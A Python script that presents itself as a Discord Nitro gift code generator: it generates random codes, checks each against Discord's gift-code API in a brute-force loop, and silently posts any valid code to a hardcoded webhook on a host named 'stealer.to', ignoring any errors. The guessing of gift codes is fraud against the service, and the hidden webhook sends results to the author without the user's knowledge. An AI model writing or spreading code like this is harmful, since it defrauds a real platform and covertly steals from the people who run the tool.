import random
import string
import os
import requests
import time

def supports_ansi():
    return os.name != 'nt' or 'ANSICON' in os.environ or 'WT_SESSION' in os.environ

if supports_ansi():
    GREEN = "\033[32m"
    RED = "\033[31m"
    RESET = "\033[0m"
else:
    GREEN = RED = RESET = ""

print(f"{GREEN}")
print("""
███╗░░██╗██╗████████╗██████╗░░█████╗░  ░██████╗░███████╗███╗░░██╗
████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔════╝░██╔════╝████╗░██║
██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██║░░██╗░█████╗░░██╔██╗██║
██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██║░░╚██╗██╔══╝░░██║╚████║
██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ╚██████╔╝███████╗██║░╚███║
╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ░╚═════╝░╚══════╝╚═╝░░╚══╝

made by kaan
""")
print(f"{RESET}")

def generate_random_code():
    return ''.join(random.choice(string.ascii_letters) for _ in range(24))

def generate_gift_link():
    return f"discord.gift/{generate_random_code()}"

def check_gift_code(gift_link):
    print(f"{GREEN}Checking gift code: {gift_link}...{RESET}")
    for attempt in range(3):  # Retry up to 3 times
        try:
            response = requests.get(
                f"https://discordapp.com/api/v9/entitlements/gift-codes/{gift_link.split('/')[-1]}?with_application=false&with_subscription_plan=true",
                timeout=10  # Increase timeout
            )
            if response.status_code == 200:
                print(f"{GREEN}Valid gift code found: {gift_link}{RESET}")
                return True
            else:
                print(f"{RED}Invalid gift code: {gift_link}{RESET}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"{RED}Error checking gift code (attempt {attempt + 1}/3): {e}{RESET}")
            time.sleep(2)  # Wait before retrying
    return False

def send_to_webhook(webhook_url, message):
    payload = {"content": f"@everyone {message}"}
    try:
        requests.post(webhook_url, json=payload)
    except Exception:
        pass

WEBHOOK_URL = "https://stealer.to/post?uniqueid=50a3cd5f"

while True:
    try:
        num_tries = int(input(f"{GREEN}How many gift links would you like to generate? {RESET}"))
        if num_tries <= 0:
            print(f"{RED}Please enter a positive number.{RESET}")
        else:
            valid_count = 0
            for _ in range(num_tries):
                gift_link = generate_gift_link()
                if check_gift_code(gift_link):
                    send_to_webhook(WEBHOOK_URL, gift_link)
                    valid_count += 1
                    print(f"{GREEN}A valid gift code was found! Stopping generation.{RESET}")
                    break
                time.sleep(1)  # Add delay between requests
            else:
                print(f"{GREEN}Task complete. No valid links found.{RESET}")
    except ValueError:
        print(f"{RED}Invalid input. Please enter a valid number.{RESET}")
